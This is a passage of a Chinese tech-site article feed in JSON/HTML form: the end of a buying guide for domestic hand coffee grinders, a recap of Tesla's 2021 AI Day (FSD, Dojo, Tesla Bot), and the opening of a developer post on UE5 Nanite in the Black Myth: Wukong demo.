src=\"https://cdn.sspai.com/2021/08/19/728340bbc0ba4a5fd6b476b83b64a3f2.png\"></figure><p>随着材料与设计的发展，现在一台好用的磨豆机，设计结构基本已经固定下来。国内也涌现出了很多设备制造商或工作室，作品也都非常不错。值得我们去选择。</p>\n<h2>为什么都是锥刀</h2>\n<p>目前不论国内外，手摇磨豆机全部采用锥刀设计。之前我也讲过，磨芯不光有锥刀，还有平刀。为什么不选择平刀呢？</p>\n<p>根据我个人的猜测和一些设计爱好者沟通的结果，认为：平刀比锥刀体积更大，研磨时产生阻力的力矩变大。相应的外壳壳体直径也要变大。对于握持来说就会更加费劲，会有很多手小的人握不住，提高了使用门槛。</p>\n<p>而想要人手带动平刀提供足够的力去有效率的研磨，就需要使用更大的力才行，如果为了省力，肯定要增长摇把的长度，改变力矩。产品就会出现头重脚轻的情况，不够协调，携带也会不方便。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/19/4ce7b84c53019d30a03447c87ec537d5.png\"></figure><p>因此，锥刀可能是在现阶段工业设计中，用户体验与产品效果互相妥协的最优解。</p>\n<h2>选购时应该注意什么</h2>\n<p>选购时，应该注意以下6个方面：</p>\n<ol>\n<li>价格</li>\n<li>研磨效率（是否费力）</li>\n<li>磨盘材质</li>\n<li>研磨质量</li>\n<li>维护成本</li>\n<li>其他因素</li>\n</ol>\n<h3>价格</h3>\n<p>手摇磨豆机的价格跨度很大，从 100 到 1000 以上各价位段都有。但是本着入门即可优秀的原则，个人认为 400元-800 元之间的价格是比较理想的一个阶段。这个价格段可以做到不错的研磨、不错的设计、不错的握持手感及做工、不错的研磨效率、也还不错的粉径分布。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/19/c33e639ed64216fa9b1c0a86fcea5416.png\"></figure><p>1000 元以上价位的机器，可以闭眼买，没什么缺点，但有时候价格被吵起来了，过高的溢价，各位只要自己有个价格预期就行。等等党永不为奴嘛！</p>\n<h3>研磨效率</h3>\n<p>一台研磨效率高的磨豆机，研磨同样的豆子所用时间更少，所需要的力气更小。</p>\n<p>研磨效率是一个系统性的工程，包含了：磨芯材质、磨芯形状、磨芯尺寸、中轴固定方式、机身握持感，摇把长短等因素决定。</p>\n<p>目前来看，手摇磨的形状已经定型，无非就是各家在材料、设计以及人机工程上的细节取舍。所以现在看磨豆机是否省力，直接看这 2 个结构：</p>\n<h4><strong>中轴固定方式</strong></h4>\n<p>中轴就是用来链接摇把与磨芯的一个主轴承。一般有两种固定方式：</p>\n<p><strong>单轴固定</strong></p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/19/08c127c5ebad39de8feceab62d453fe2.png\"></figure><p>这种磨豆机，基本都是一根主轴，与上方摇把处的一个轴承链接，下方的主轴直接链接磨芯固定。这种固定方法在研磨时，主轴会晃动，影响研磨均匀度和效率。使用一段时间后，细粉比例会严重增多。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/19/b907e73a75f279b269246b174bfd7b62.png\"></figure><p><strong>双轴固定</strong></p>\n<p>在达到一定售价的磨豆机中，就已经全部采用双轴固定的设计了。如下图所示：红色部分为上、下两个轴承。中间黄色部分，为六角主轴，主轴再连接磨芯。这样的结构可以在研磨时，尽可能保证转动时没有位移、抖动。确保研磨的效率、研磨的质量。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/19/44e8a7dff6a7d0bcd035b0a5020426fb.png\"><figcaption>海勒101设计结构图</figcaption></figure><p>另外，在双轴固定的做法中，轴承一般采用两种材质：<strong>轴承钢、陶瓷</strong></p>\n<p><strong>轴承钢：</strong>就是使用标准轴承钢，轴承钢有高而均匀的硬度和耐磨性，以及高的弹性极限，寿命较长、更换方便。但它不是不锈钢，不能水洗，会生锈。轴承钢内部有润滑脂，作用是润滑、防锈。因此拿到新货时，可能会有淡淡的润滑油味道。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/19/c7f528332a1e37d24ec112f7602c9fea.png\"></figure><p><strong>陶瓷：</strong>陶瓷轴承无润滑脂、无气味、可水洗。由于陶瓷的弹性模量比钢高，受力时不易变形，因此有利于提高工作速度，并达到较高的精度。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/19/4ac586cd70153264c9bf6e86e4f1b4ae.png\"></figure><p>个人觉得，钢刀+陶瓷轴承是一个比较理想的组合方式。</p>\n<h3>磨盘材质</h3>\n<p>磨盘是一个磨豆机的核心，耐用性、研磨均匀度、研磨效率都跟它有直接关系。</p>\n<p>想要提高研磨效率，就把盘做大，越大的盘，同时研磨的咖啡豆就越多，自然效率就会高一些。再配合硬度高、更锋利的磨芯，效率又会进一步提升。</p>\n<p>磨芯的尺寸，绝大部分都在 38mm，一些更进一步（更贵）的磨豆机，会采用48mm。</p>\n<p>目前行业内，磨芯的材质基本分 2 种：</p>\n<p><strong>金属：</strong>用到最多的金属材质是 420 不锈钢与合金。420 不锈钢是成本、硬度等指标都较为均衡的一种材质，因此大部分磨豆机都使用这种材质。除了常用的 420 不锈钢，还有高碳钢、高氮钢等材质。其中合金材质只有在比较贵的刀盘或电动磨豆机上经常出现，比如钛合金。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/19/f665acade3e6171e4d71593621949e3c.png\"></figure><p>金属材质的磨芯，还会单独出一种意式磨芯，专门用来出品意式研磨度的磨芯。意式磨芯，要比单品磨芯的硬度高（我用的这款是这样），而且锥刀的刻度比单品的多。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/19/00f337d2a1029c0c21c68a93de8b20ca.png\"></figure><p><strong>陶瓷：</strong>目前陶瓷磨芯高端机上边用的很少（400 元以上就不用了）。基本上都在 200 元以下的机器上使用，比如 Hario 2TB。陶瓷磨芯的特点是摩擦起热小，但是边缘比较钝，缝隙大所以研磨效率、均匀度都不如金属材质。而且陶瓷材质很脆，怕摔，摔一下有可能磨芯就会崩口。</p>\n<h3>研磨质量</h3>\n<p>我们如果要参考研磨质量就需要自己尝试或者看一些测评者的详细测评才可以知道。咖啡粉研磨质量的高低，最基本的就是发热小（香气挥发小），研磨均匀（大小均匀、细粉少）。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/19/fce6891d56830e5dfe111b51ae4ce40c.png\"><figcaption>某国产品牌单品磨，研磨效果</figcaption></figure><p> </p>\n<p>研磨质量在这里也无法去评测，只能通过我之前使用过的产品来给大家描述一下。如果你想自己测试一下，可以买一套咖啡粉筛网，可以测试细粉的占比，占比越低，研磨越均匀。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/19/0e1eb4049be8deed4b58629fe0589875.png\"></figure><p>可以肯定的是，目前越贵的产品，研磨度越均匀，但这个价格的提升也有边际递减效应。一般情况1500元就已经达到了界限值，如果要突破这个界限，可能成本就需要成倍的翻起来才行。</p>\n<h3>维护成本</h3>\n<p>不论什么设备，长时间使用的情况下都需要定期进行维护。磨豆机应该在半个月左右拆开清理一下残粉，长时间不清洁，会让设备产生一些异味，如果长时间不使用，也应该清洁干净后收藏。除了清洁残粉，还可以一定周期重新给轴承上润滑脂，保证研磨效率，降低轴承长时间摩擦带来的损耗。延长使用寿命。</p>\n<p>另一方面，一些耗损配件也要定期更换，最常换的就是磨芯，根据研磨量、豆子的硬度，一般推荐单磨芯 1-2 年更换一次，如果不更换，后期研磨时，细粉就会越来越多，刀也会钝，影响研磨效率。</p>\n<p>有些设备，可以免拆维护，有的需要使用拆卸工具辅助，根据个人情况选择。</p>\n<h3>其他因素</h3>\n<p>还有一些不是核心要素，但也左右着你的选择：</p>\n<ol>\n<li>颜值、材质</li>\n<li>便携性（体积大小、重量、把手是否可折叠等）</li>\n<li>豆仓容量</li>\n<li>粉杯连接方式（胶皮圈、磁吸、螺纹等）</li>\n</ol>\n<h2>国产手摇磨豆机推荐</h2>\n<p>推荐几个个人认为性价比颇高的国产磨豆机。这些磨豆机有的我用过，有的是询问了使用人后的感受。价格控制在 400-800 元以内。这是一个极具性价比的价格段，已经可以满足 90% 的人从入门到进阶了。</p>\n<h3>匿名 2</h3>\n<p>匿名 2 是一款个人工作室出品的磨豆机。起家于当年的「咖啡贴吧」。在贴吧里，作者发明了匿名 1 代，在贴吧内部爆火。之后推出了现在的 2 代，是一款极具性价比的手摇磨。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/19/7ae2bce008f87fb8f8ab8c1013361f3e.png\"></figure><p>整体做工还是过的去的，就是这个防滑硅胶垫有点粗糙，上部都舱盖是塑料的。</p>\n<p>这款磨风味单品磨和意式磨两款。单品磨 480 元，意式磨 580 元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/19/2b9687a4f0f2ece53aa21f824985e2f3.png\"></figure><p>这款磨也是双轴固定，内调粗细，整体的研磨分布还是不错的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/19/ad157b72a53cbf1175dcbb4b8b03d959.png\"></figure><h3>汉匠</h3>\n<p>汉匠这个机器是最近比较火的一款国产磨豆机。分为 K0、K1、K2 三款入门级；K3、K5 中阶款和 K4、K6 两款进阶级。</p>\n<p>个人推荐从 K3、K5、K4、K6 选起，一步到位。</p>\n<p>汉匠的刻度调节分为外调版与内调版两种。内调不多说，外调则是从杯体上旋转调节。从使用角度来讲，外调更方便使用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/19/ce7698dd5f6a4b67fdb60b3eddbdb678.png\"></figure><p>从刀盘来说，就是不分单品刀和意式刀，通过统一的刀盘配合细腻的研磨刻度调节来兼容意式与手冲的研磨度，比较省事。</p>\n<p>K3-K6 的价格为 439-638 元，可根据需要自行选择。</p>\n<h3>海勒设计</h3>\n<p>我用的是海勒 101 这款机器。海勒设计也是一个工作室在北京。主要做手摇磨豆机的自主设计和生产。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/19/5db782bc9f8a3186d2fbd8f539021715.png\"></figure><p>这款磨也是双轴固定，轴承是轴承钢，全身一体成型，做工真的好，缺点是粉杯是通过胶皮圈连接，容易脏也容易干裂。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/19/3053910d49663f254c6856faf633b1b8.png\"><figcaption>海勒官方拆装指导视频</figcaption></figure><p>维护保养，需要用工具拆卸，比较考验动手能力。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/19/7051ade747ccbc95759c8cf45533fee7.png\"><figcaption>我的海勒101研磨效果</figcaption></figure><p>这款磨也分为单品磨芯、意式磨芯、陶瓷磨芯。可原地替换。海勒 101 售价 749 元（普通装）</p>\n<h3>玲珑 ACE40Plus</h3>\n<p>玲珑这款机器，也是国内个人开发的磨豆机。这版 40P，根据某爱好群内群友分享，用着还行。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/19/870c66e2d4519e76659ee26b91266b2e.png\"></figure><p>这款机器据群友说是 48mm 的刀，研磨均匀度还不错。这家老板比较佛系，售后不好说，看运气。所以这款磨虽然效果上推荐，但整个产品的购买后续体验不多做评价。</p>\n<p>这款机器 699 元。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/19/bbc25f87642413b339054f7cc09311da.png\"></figure><p>群友分享的 40P 的手冲研磨度，粗看还是比较均匀的。</p>\n<h2>总结</h2>\n<p>最后想跟大家说的是，咖啡行业有越来越多的国内企业或个人参与进来，不管是凭借爱好发展出的小生意，还是专注于行业想打造中国品牌的企业。我相信都会做的很好，只是需要被更多的人挖掘出来， 让更多的人知道，这篇文章就是想跟大家说说国产比较冷门的磨豆机，让更多人知道我们国家自己的产品也很好用，性价比很高。</p>\n<p>PS：选购需谨慎，此篇文章仅供参考。也欢迎有同款机器的朋友评论分享一下使用体验。</p>\n","link":"https://sspai.com/post/68374"},{"title":"AI Day 汇总：特斯拉是一家 AI 机器人公司吗？","date":"2021-08-24 03:17:16","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>特斯拉是一家什么公司？</p>\n<p>第一层，2003 年，特斯拉以新造车公司的身份亮相；</p>\n<p>第二层，2016 年，收购了 Solarcity 的特斯拉是一家能源公司；</p>\n<p>第三层，2019 年，特斯拉推出自主研发的 FSD 芯片，成为一家自动驾驶公司；</p>\n<p>第四层，2020 年，特斯拉介入电池的设计和研发，进阶到一家动力电池公司； </p>\n<p>Elon Musk 在第五层。今天，特斯拉通过自主研发的大规模深度神经网络训练集群 Dojo 和人工智能机器人 Tesla Bot 佐证了 Elon 说的那句话：<strong>「从长远来看，人们会将特斯拉视为一家人工智能机器人公司，就像今天被视为汽车或能源公司那样」</strong>。</p>\n<p>美东时间 8 月 19 日下午 5 点，特斯拉举办了 AI Day 人工智能日，整场发布会分为三大节：</p>\n<p>特斯拉 AI 和视觉高级总监 Andrej Karpathy、Autopilot 全栈算法总监 Ashok Elluswamy 和 Autopilot 工程总监 Milan Kovac 介绍的 FSD 完全自动驾驶最新进展。</p>\n<p>特斯拉 Project Dojo 项目高级总监 Ganesh Venkataramanan 介绍特斯拉大规模深度神经网络训练集群。</p>\n<p>Elon Musk 发布特斯拉机器人 Tesla Bot。</p>\n<p>关于 Elon 之外的特斯拉高管们，这张组织架构图可以作为参考：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/20/article/bc4b16cd7303a125a655b01277539c0f\"></figure><h2>FSD 的最新进展</h2>\n<p>相比全新的 Dojo D1 芯片和 Tesla Bot 机器人，已经在 2019 年自动驾驶日做过部分阐述的 FSD 更像是一个阶段性更新，我们选择几个值得关注的部分来谈谈。</p>\n<p>首先是 <strong>HydraNets 九头蛇多任务学习网络更为简化的变更</strong>。众所周知，在特斯拉 FSD 的研发走到「智能召唤」阶段时，基于图像级别的架构在向量空间中被证明是不起作用的，于是特斯拉从零开始完全重写了整个深度神经网络栈。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/20/article/f72387cbe8585cb3a75ee31db5402270\"></figure><p>这里 Andrej 提到了 FSD 推倒重来的核心思想，就是极限简化（extremely simplified）。<strong>从摄像头校准、缓存、车队管理以及优化和简化所有的任务架构。</strong></p>\n<p>这种「极限简化」是 Elon 在工程设计上最重要的思想之一，他此前多次谈到解决问题前要质疑问题的合理性，<strong>天才工程师们最容易陷入的陷阱是，试图给一个错误的问题提供解决方案</strong>，却很少质疑问题本身的合理性。</p>\n<p>「极限简化」无疑会对 FSD 的发展产生广泛的影响。Andrej 最后总结说，今天 FSD 的架构比以往任何时候都结合得更紧密。Andrej 展示了 FSD 的最新架构，长这样。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/20/article/8245f08a6fe69097ff3766f0b9c02362\"></figure><p>从当下来看，基于时间序列的多摄像头视频架构显然取得了巨大的收益。除了相比 Beta 8 表现取得显著改进的 Beta 9，<strong>特斯拉通过新的架构更好地测量深度和速度信息，用 3 个月时间完全抛弃了前向雷达，开始基于纯视觉来运行 Autopilot 和 FSD。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/20/article/bd82327ebdb0e1c4114350d2e9b20d8f\"></figure><p>新的架构下车辆在通过复杂的交叉路口时，FSD 会通过特别的 RNN 循环神经网络来进行预测，如果沿着同一条路口有多辆特斯拉经过或一辆车多次经过，深度神经网络通过交叉路口时的预测会更「聪明」，<strong>最终，FSD 将学会在场景类似但从未去过的路口自动驾驶。</strong></p>\n<p>其次是<strong>数据标注</strong>。在这之前，特斯拉曾经通过和第三方标注公司合作来获得标注数据集，以训练深度神经网络——这是业内通行的做法。但基于垂直整合的原则，特斯拉的数据标注全面转向了内部自主推进，特斯拉目前拥有 1000 人规模的标注团队。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/20/article/64f1d4cf25e35a367755da5b6cc3e3ac\"></figure><p>在具体形式上，特斯拉的标注数据集最初是基于图片的 2D 标注，但当整个感知架构转向 4D 后，在向量空间中进行 2D 标注并不高效，数据标注也随之过渡到了 4D 标注。Ashok 指出，有太多的标注需要进行，基于手动标注是难以为继的，因此，<strong>特斯拉最终开发了自动标注工具。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/20/article/6b6c1f27d73fa10ab713cb09a782102f\"></figure><p>根据 Ashok 的说法，目前特斯拉的车队可以在一周内完成 10,000 个视频的采集和自动标注。</p>\n<p><strong>特斯拉已经完成了超过 100 亿次标注。</strong></p>\n<p>最后是<strong>仿真模拟</strong>。在 2019 年的自动驾驶日上，Elon 对基于仿真模拟进行的自动驾驶算法的开发并不十分感冒。而今天的仿真模拟环节提到了仿真模拟的巨大价值。简单来说有三种情况。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/20/article/31d494e6bf7c11f03b1c63678f4b0493\"></figure><p>场景过于罕见（例如在高速上跑步的人，即使基于全球的车队采集，这样的场景也很少）；</p>\n<p>难以标注（如视频里出现几十个人）</p>\n<p>闭环中的依赖汽车行为的规划（人为设计效率更高）</p>\n<p>值得一提的是，Elon 在 2019 年对模拟的评价是，没有什么模拟技术能媲美摄像头采集场景下的真实和复杂，除非人为设计一个 1:1 现实场景的仿真器，但那样的话成本会远高于从现实场景中采集数据。</p>\n<p>那么，这是今天 Autopilot 的仿真器。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/20/article/ac6fa80c2885922f1712795bcdfad1b0\"></figure><p>坦白说，除了车内的驾驶员，我们肉眼已经很难分辨什么是特斯拉仿真模拟的，什么是现实的场景。根据 Ashok 的说法，<strong>Autopilot 仿真器中建立了 2000 英里长的道路，已经有 3.71 亿张模拟图像和 4.8 亿个立方体。</strong></p>\n<p>通过对比 2019 年和 2021 年特斯拉对仿真模拟的态度，其实我们可以发现，特斯拉的 FSD 研发有点「改革进入深水区」的味道。到 2021 年，对于某些摄像头采集难以解决的极端场景，高精度的仿真模拟成了效率最高的策略。</p>\n<p>当然，这与以 Waymo 为首（现实场景 2000 万英里，仿真超 100 亿英里）的仿真策略仍有本质的不同。</p>\n<p>总体而言，<strong>即使基于当下的 HW 3.0 硬件，特斯拉 FSD 算法演进的瓶颈似乎还很遥远</strong>，结合 Elon 此前透露的 Beta 10 会涉及架构的重大变化，我们有理由相信，FSD 的潜力不止于此。</p>\n<h2>Dojo 超级计算机</h2>\n<p>Dojo 诞生的动机简单粗暴。Ganesh 说，几年前，Elon 想要一台超快的训练计算机来训练 Autopilot。现在，Dojo 来了。</p>\n<p>下面是 Ganesh 的秀肌肉环节。Dojo 的目标是，实现最好的 AI 训练性能；使能更大更复杂的深度神经网络模型；<strong>高效率、低成本</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/20/article/562577503f994704b8fe88250f29d848\"></figure><p>Dojo D1 芯片，基于 7nm 工艺打造，核心参数如下：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/20/article/23faad9bd86e47c4b2636e94dfae2882\"></figure><p>单芯片 FP32 算力 22.6 TFLOPs</p>\n<p>BF 16 算力 362 TFLOPs</p>\n<p>On-chip 带宽 10 TB/ 秒</p>\n<p>Off-chip 带宽 4 TB/ 秒</p>\n<p>这样的带宽是什么水平呢？远远超越 Google 的 TPU v3，遥遥领先英伟达最新的 GPU。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/20/article/0fca10bd5ce3346e6fa64d8ebf5fae80\"></figure><p>而发布会前邀请函中展示的，是通过 25 个 D1 芯片组成的训练模块，单模块算力 9 PFLOPs，带宽 36 TB/秒。 120 个训练模块、3000 个D1 芯片组成的 Dojo ExaPOD，<strong>总算力超过了 1.1 EFLOPs，超过日本富士富士通 0.415 EFLOPs 的算力，登顶全球第一。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/20/article/3696afb2cd29dec365cecee713048249\"></figure><p>最终，Dojo 将成为速度最快的 AI 训练计算机，与现有计算机相比，性能提升 4 倍，能效提升 1.3 倍，占地面积减小到原先的 1/5。</p>\n<p>所以特斯拉是怎么做到的？</p>\n<p>在特斯拉官方的话术里，Dojo 被称为是 Pure Learning Machine，纯学习机器。某种程度上，两年前 FSD 芯片是怎样炼成的，Dojo 就是怎样炼成的。</p>\n<p>特斯拉硬件工程副总裁 Pete Bannon 说过，FSD 芯片最大的优势就是「只有一个客户特斯拉」。Dojo 也一样，Elon 在今天的 QA 环节表示，<strong>「Dojo是一种专为深度神经网络训练而生的计算机，CPU 和 GPU 都不是为训练而设计的，让我们全面的ASIC（Application Specific Integrated Circuit，为专门目的而设计的集成电路）化」</strong>。</p>\n<p>关于 Dojo，我们还需要想得更多。</p>\n<p>在此之前，超级计算机用来干什么？由专业的计算机设备制造商研发，各大国的国家级实验室持有，主要的用途无外乎中长期天气预报、油气勘探、物理模拟、量子力学、疫情防控科研等超大型计算应用场景。</p>\n<p>那么特斯拉呢？一家年销量 50 万辆（以 2020 年计）的小型车企，如今一手缔造了全球算力最强的超级计算机。</p>\n<p>整体而言，<strong>特斯拉推进自动驾驶研发的策略与 OpenAI 崇尚暴力美学推进 AI 算法迭代的方法论相一致</strong>，尽管该策略在业内充满争议，但特斯拉无疑在以真金白银的实际行动在验证超大规模数据的潜力。</p>\n<p>这与当下所有自动驾驶公司的研发策略都有本质的不同。</p>\n<h2>Tesla Bot</h2>\n<p>全场唯一由 Elon 主持的部分是一个人工智能机器人，Tesla Bot。具体信息如下：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/20/article/937240570ea373647f9d633068bb8686\"></figure><ul>\n<li>身高 5 英尺 8 英寸，约 172 cm；</li>\n<li>体重 125 磅，约 56.7 kg；</li>\n<li>承载能力 45 磅，约 20 kg；</li>\n<li>最快行走速度 5 英里/小时，约 8 km/h</li>\n</ul>\n<p>Tesla Bot 的脖子、胳膊、手、腿累计搭载了 40 个机电推杆。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/20/article/9f006b54448c0c57cbfc32669e15856e\"></figure><p>Autopilot 摄像头会作为 Bot 的眼睛，胸腔内是特斯拉 FSD 芯片，此外，前文提到的多摄像头视觉架构的深度神经网络架构，包括规划、自动标注、仿真、Dojo 训练也都会用于开发 Bot。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/20/article/83f1f040e97fc5b2c9139a262ee80ce6\"></figure><p>Tesla Bot 创下了特斯拉产品贩卖「预期」的新高度。这个新产品的原型要到 2022 年才会亮相，发布会现场更是直接上演了真人扮演的戏码。</p>\n<p>对于 Tesla Bot，Elon 在发布会后解释说<strong>「特斯拉几乎拥有类人机器人所需的所有部件，我们已经制造了带有轮子的机器人」</strong>。</p>\n<p>这显然不能成为一个新产品立项的理由，很难降低的成本（基于硬件判断）加上相对羸弱的实用性（20 kg 的负重），今天的 Tesla Bot 既不能改变世界，也很难扮演特斯拉市值管理工具的角色。</p>\n<p>所以特斯拉更本质的动机是什么？</p>\n<p>在后续的 QA 环节，Elon 不意外地提到了「全民基本收入」（universal basic income）。</p>\n<blockquote><p>What happens when where there is no shortage of labor? That's why I think, long term, there will have to be universal basic income.But not right now because there bot doesn’t work yet. In the future physical work will be a choice.当劳动力不再短缺（机器人取代）时会发生什么？这就是为什么我在想，从长远来看，必须有全民基本收入。但不是现在，因为机器人还不能工作。今后体力劳动将变成一个选项。</p></blockquote>\n<p>Elon 和他的好友们，包括 Google 创始人 Larry Page、Twitter CEO Jack Dorsey，以及 OpenAI CEO Sam Altman，<strong>一直在谈论后人工智能时代的社会经济的运行范式，机器人取代人类进行重复性劳动，政府主导实行「全民基本收入」会是其中的重要组成部分。</strong></p>\n<p>机器人取代人类进行重复性劳动的第一步是，制造一个机器人。</p>\n<p>Tesla Bot 并不会在当下给我们的生产生活带来重大影响，相反，它十足的不完善，甚至没有原型。2022 年下定一个人工智能机器人比 2004 年花 10 万美元购买一辆纯电动的跑车更让人匪夷所思。<strong>但它是一个起点，特斯拉开始全新的扩张。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/20/article/236c96456b561b6b6cb4599d40aaa231\"></figure><p>Tesla Bot 就像 2004 年 JB Straubel 手工打造的特斯拉 VIN 001 号 Roadster，「最终，人们会将特斯拉视为一家人工智能机器人公司」。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68408"},{"title":"8 月 20 日游戏科学放出《黑神话：悟空》 UE5 实机内容演示，有哪些新信息？","date":"2021-08-20 04:00:11","description":"\n<p>大家好，游科小码农又来了~</p>\n<p><br></p>\n<p>离《黑神话：悟空》的首部视频发布刚好过去了一年。</p>\n<p>这365日，每日都在思考，怎么为这款东方写实画风的作品，带来尽可能高质量的画面，从技术层面排除一切障碍。</p>\n<p>就以首发视频来说，其实当时是留了一些遗憾的。</p>\n<p>例如，我们之前使用1080p而不是4k分辨率录制，另一方面看到了惊艳的UE5发布视频之后，也苦于没有办法渲染出同等高精细度的画面。</p>\n<p><br></p>\n<p>所以这次的视频，我们尝试追求两个目标：</p>\n<p><b>挑战更高的场景品质</b></p>\n<p><b>向4k60帧做一次冲刺</b></p>\n<p><br></p>\n<p>而这次的视频，有两个关键词：<b>UE5  &amp;  DLSS</b></p>\n<p>相信有些玩家朋友们已经get到，我们在这次实机录制中，借助Epic最新的UE5引擎，搭配Nvidia的DLSS技术，在画质和性能这两个本来是矛盾的维度上，同时获得了非常大的提升。</p>\n<p>我们一起来看看，这些新技术给这次的实机视频带来了怎样的提升。<br></p>\n<p><b>-Nanite</b></p>\n<p>UE5发布时展示了非常惊艳的Nanite技术，使用Nanite之后可以高性能渲染出面数以亿计的超高精度场景。这意味着我们可以使用精度非常高的模型去制作我们的场景。</p>\n<p>结合UE5的新阴影渲染技术virtual shadow map（虚拟阴影），还可以渲染非常高细节度的阴影。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b2973ca07ccfacddf81bbd79d5eec7d0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1611\" data-rawheight=\"692\" data-watermark=\"watermark\" data-original-src=\"v2-b2973ca07ccfacddf81bbd79d5eec7d0\" data-watermark-src=\"v2-b54a9d170f424ce335f80cb4d0f2ec93\" data-private-watermark-src=\"v2-58d69696dcf879a1c322a2fe968a68fc\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-ea83c264bf0a00f8078dccbabc2bfd7e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"600\" data-watermark=\"watermark\" data-original-src=\"v2-ea83c264bf0a00f8078dccbabc2bfd7e\" data-watermark-src=\"v2-cd6f802a013747b825e1492fb573b971\" data-private-watermark-src=\"v2-20a07b986fb2784bc2b19e293fef3680\"></p>\n<p><br></p>\n<p>有了Nanite之后我们遇到的最大问题反而是：我们之前很多的资产精度反而变得偏低了。后续一个很关键的工作，就是提升资产的质量。大家可以对比一下我们之前用的石头和现在用的石头。</p>\n<p>（左为新模型，右边是旧模型，每个颜色块都是一个三角形，越密代表面数越高）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d17ed7140db9c258abb1dd01ed3e7449_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1402\" data-rawheight=\"469\" data-watermark=\"watermark\" data-original-src=\"v2-d17ed7140db9c258abb1dd01ed3e7449\" data-watermark-src=\"v2-5cdabb16fc345f10649547b6fa7799e6\" data-private-watermark-src=\"v2-17043a1b6221c087afe20a88750e0b1e\"></p>\n<p>很多朋友可能会想，Nanite带来那么高精度的画面，是不是我的电脑更加带不动了。</p>\n<p><b>事实上刚好相反。</b></p>\n<p>Nanite本身的作用是优化性能。正是因为性能优化了，才有能力渲染更高精度的模型。</p>\n<p>相同精度的模型，基本上在Nanite下渲染都能获得比以前好得多的性能。</p>\n<p>实际上Nanite才是拯救显卡的神器。</p>\n<p>我们非常多的场景在Nanite的加持下获得50%以上的帧率提升。</p>\n<p>以视频中这个大殿为例，是一个复杂度非常高的场景，里头的亭台楼阁都是非常精细的、可以放大作为场景建筑使用的高面数模型，在RTX2060@1080p下，开启Nanite可以轻松达到接近70fps，而关闭后大概是38fps左右。提升非常明显。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-fd646dd30287477e7069622527700453_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" 